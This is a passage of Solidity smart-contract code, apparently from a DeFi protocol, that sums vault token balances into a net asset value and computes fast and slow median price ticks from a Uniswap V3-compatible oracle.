        for (uint256 i = 0; i < underlyingTokens.length; i++) {
            if (underlyingTokens[i] == underlyingToken) skipUnderlying = true;
        }
        if (!skipUnderlying) nav += IERC20Partial(underlyingToken).balanceOf(_vault);
    }

function getOracleTicks(
        IV3CompatibleOracle oracleContract,
        uint256 miniMedian
    )
        external
        view
        returns (
            int24 fastOracleTick,
            int24 slowOracleTick,
            int24 latestObservation,
            uint256 medianData
        )
    {
        uint16 observationIndex;
        uint16 observationCardinality;

        (, , observationIndex, observationCardinality, , , ) = oracleContract.slot0();

        (fastOracleTick, latestObservation) = computeMedianObservedPrice(
            oracleContract,
            observationIndex,
            observationCardinality,
            Constants.FAST_ORACLE_CARDINALITY,
            Constants.FAST_ORACLE_PERIOD
        );

        if (Constants.SLOW_ORACLE_UNISWAP_MODE) {
            (slowOracleTick, ) = computeMedianObservedPrice(
                oracleContract,
                observationIndex,
                observationCardinality,
                Constants.SLOW_ORACLE_CARDINALITY,
                Constants.SLOW_ORACLE_PERIOD
            );
        } else {
            (slowOracleTick, medianData) = computeInternalMedian(
                observationIndex,
                observationCardinality,
                Constants.MEDIAN_PERIOD,
                miniMedian,
                oracleContract
            );
        }
    }